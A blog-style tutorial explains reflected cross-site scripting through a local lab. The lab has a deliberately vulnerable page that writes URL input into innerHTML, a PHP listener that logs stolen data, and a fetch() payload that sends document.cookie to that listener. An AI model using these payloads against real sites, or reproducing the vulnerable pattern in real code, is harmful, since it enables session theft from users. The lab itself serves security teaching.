---
title: "Reflected XSS: Explained with Real Examples"
author: saramazal
layout: post
date: 2025-04-17
categories: [XSS]
tags: [xss, web, pentesting, tryhackme, client-side, appsec]
img_path: /images/covers
image:
  path: /images/covers/pink-girl5.jpg

---

## 🧠 Reflected XSS – Real-World Lab 

Welcome to a practical breakdown of Reflected Cross-Site Scripting (XSS) – one of the most common and critical client-side vulnerabilities. This lab was designed for hands-on understanding, simulating how attackers think and how defenders must secure.

---

### 🚨 What is Reflected XSS?

Reflected XSS occurs when untrusted input from the URL or form gets reflected back into the web page without proper sanitization. This leads to code execution in the victim's browser.

**Example Attack:**  
```html
http://victim-site.com/page?q=<script>stealCookies()</script>
```

---

### 🧪 Lab Objective

- Understand how input reflects in HTML
- Learn to craft XSS payloads
- Use `document.cookie` and `fetch()` to simulate data theft
- Log stolen data server-side

---

### 🧱 Lab Structure

```
xss-lab/
├── xss-lab.html        # The vulnerable page
├── steal.php           # Attacker’s listener
├── requests.log        # Logs captured cookies
├── cookie.txt          # Used for testing cookies
```

---

### 🔧 Code Setup

**xss-lab.html**
```html
<html>
<body>
  <h2>Reflected XSS Demo</h2>
  <div id="output"></div>

  <script>
    const q = new URLSearchParams(location.search).get('q');
    document.getElementById('output').innerHTML = q;
  </script>
</body>
</html>
```

**steal.php**
```php
<?php
file_put_contents("requests.log", print_r($_GET, true) . "\n", FILE_APPEND);
?>
```

---

### 🚀 Running the Lab

1. Launch local server:
```bash
php -S localhost:8080
```

2. Simulate cookie in DevTools:
```js
document.cookie = "session_id=mazal_lab";
```

3. Trigger XSS:
```html
http://localhost:8080/xss-lab.html?q=<script>fetch('http://localhost:8080/steal.php?c='+document.cookie)</script>
```

4. View stolen data:
```bash
cat requests.log
```

---

### 🛠️ Bonus UI Inputs

Add these to your lab to explore inputs:
```html
<input type="text" placeholder="Search...">
<textarea placeholder="Write a comment..."></textarea>
<input type="file" accept="image/*">
```

---

### 🧠 Key Takeaways 

- Reflected XSS is immediate and dangerous
- Always validate & sanitize user input
- Look for reflected user input in URL, forms, search bars
- Test with `<script>alert(1)</script>` or `fetch()` calls

---

This lab simulates a real attack chain and teaches defenders to think like attackers. Keep experimenting, and remember: break things safely, learn deeply.

Stay sharp,  
**Maz4l** 🐾


---



*More hacks, more notes, more wins.*

